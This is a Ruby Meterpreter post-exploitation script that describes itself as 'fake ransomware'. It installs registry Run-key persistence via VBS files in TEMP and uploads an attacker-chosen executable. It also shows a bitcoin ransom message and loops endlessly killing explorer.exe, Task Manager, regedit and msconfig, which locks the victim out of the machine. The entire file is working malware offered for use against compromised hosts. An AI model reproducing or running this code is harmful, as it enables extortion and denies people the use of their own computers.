# Author: Wave
print_status("Hello World")

@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
"-m" => [ true, "message to show (usefull for paiement) default : All your data are encrypted, pls pay to ********** bitcoin address to unlock this computer"],
  "-f"  => [ true,  "custom exe to upload"],
"-s"  => [ false,  "install in HKLM as system user"],

)
exe = ""
tempvbs = ""
processp = "explorer.exe"
processq = "Taskmgr.exe"
processr = "regedit.exe"
processs = "msconfig.exe"
already = 0
key = "HKCU"
message = "All your data are encrypted, pls pay to ********** bitcoin address to unlock this computer"
nam = Rex::Text.rand_text_alpha(rand(8)+8)
# Usage Message Function
#-------------------------------------------------------------------------------
def usage
print_status("Fake ransoneware that dont encrypt data but just make the computer inaccessible")
print_status("add this script to Autorunscript in your listener, set exitonsession false")
print_status("to unlock, host must reboot in failsafe mode to delete persistence key")
  print_line(@exec_opts.usage)
  raise Rex::Script::Completed
end
##########functions killing process##############
 def procmon(processp,processq,processr,processs)
     procs = []
     existingProcs = []
     detected = false
     first = true
     print_status("Monitoring new processes.")
     while detected == false
 #        sleep 1
         procs = client.sys.process.processes
         procs.each do |p|
            if p['name'] == processp or p['name'] == processq or p['name'] == processr or p['name'] == processs
                  if !existingProcs.include? p['pid']
                      print_status("New process detected: #{p['pid']}#{p['name']}")
proccpid = p['pid']
print_status("killing #{p['name']}, pid = #{p['pid']} process...")
                      client.sys.process.kill(proccpid)
print_good("YOU SHOULD NOT PASS, #{p['name']} !!!")
                      detected = true
                  end
           end
         end
     first = false
     end
  end
#######persistence#########"
def persistement(nam,exe,key)
location = session.sys.config.getenv('TEMP')
keyvaluevbs = "\"#{location}\\#{nam}.vbs\""
vbs = "#{location}\\#{nam}.vbs"
print_status("#{location}")

#installing persistence in registry
  key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  print_status("Installing into autorun as #{key_path}\\#{nam}")
    registry_setvaldata("#{key_path}", nam, keyvaluevbs, "REG_SZ")
print_status("work done")
####done###

#uploading needed files
        fileexe = "#{location}\\#{nam}.exe" 
      print_status("\tUploading exe...")
      session.fs.file.upload_file("#{fileexe}","#{exe}")
      print_good("\tpersistence.exe uploaded!")
      print_status("\tUploaded as #{fileexe}")
end
####done###
###########

#######persistence message#########"
def persistementmsg(msgvbs,key)
keyvaluevbs = "\"#{msgvbs}\""
vbs = msgvbs
print_status("#{msgvbs} will be installed in registry")

#installing persistence in registry
  key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  print_status("Installing into autorun as #{key_path}\\message")
    registry_setvaldata("#{key_path}", "message", keyvaluevbs, "REG_SZ")
print_status("#{key_path}, message, #{keyvaluevbs}, REG_SZ installed")
####done###
end
####done###
###########
#######FUNCTION TO CHECK PREVIOUS LOG FILES#######
def log_check
  #Get hostname
  host = @client.sys.config.sysinfo["Computer"]

  logs = ::File.join(Msf::Config.log_directory, 'simple_ransonware',
                       Rex::FileUtils.clean_path(host) )


  testlogfile = "#{logs}#{host}.txt"
  if ::File.exist?(testlogfile)
print_error("host already Persistemented!")
    already = 1
else
already = 0
end

print_error("Logs file for this host is #{testlogfile}")
return already
end

########FUNCTION TO CREATE LOGFILE###############
def log_file
  #Get hostname
  host = @client.sys.config.sysinfo["Computer"]

  logs = ::File.join(Msf::Config.log_directory, 'simple_ransonware',
                       Rex::FileUtils.clean_path(host) )


  ::FileUtils.mkdir_p(logs)

  logfile = "#{logs}#{host}.txt"

file_local_write(logfile, "This host has been Persistemented ! Maybe u wont persist another time, do u ?")
  return logfile
print_status("logs are stored in #{logs}")
print_status("log for this host is #{logfile}")
end
################write message and persistence vbs script#########
def write_msg_to_target(nam,message)
print_status("Writting message script on host...")
location = session.sys.config.getenv('TEMP')
msgvbs = "#{location}\\msg.vbs"
mg = @client.fs.file.new(msgvbs, "wb")
mg.write("msgbox(\"#{message}\")")
mg.close
return msgvbs
end

def write_script_to_target(nam)
print_status("Writting persistence script on host...")
location = session.sys.config.getenv('TEMP')
tempvbs = "#{location}\\#{nam}.vbs"
  fd = @client.fs.file.new(tempvbs, "wb")
      vbs = "Set WshShell = WScript.CreateObject(\"WScript.Shell\")
do
WshShell.Run (\"%TEMP%/#{nam}.exe\")
WScript.Sleep 36000000
Loop"
  fd.write("#{vbs}") 
  fd.close
  print_good("persistence script written to #{tempvbs}")
return tempvbs
end
##############options############
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-m"
    message = val
 when "-f"
    exe = val
 when "-s"
    key = "HKLM"
end
}
#################MAIN##################
already = log_check
if already == 0
tempvbs = write_script_to_target(nam)
msgvbs = write_msg_to_target(nam,message)
persistement(nam,exe,key)
persistementmsg(msgvbs,key)
end
log_file

print_good("Wont let #{processp},#{processq},#{processr} pass !")
while 1 == 1
#sleep 1
procmon(processp,processq,processr,processs)
end

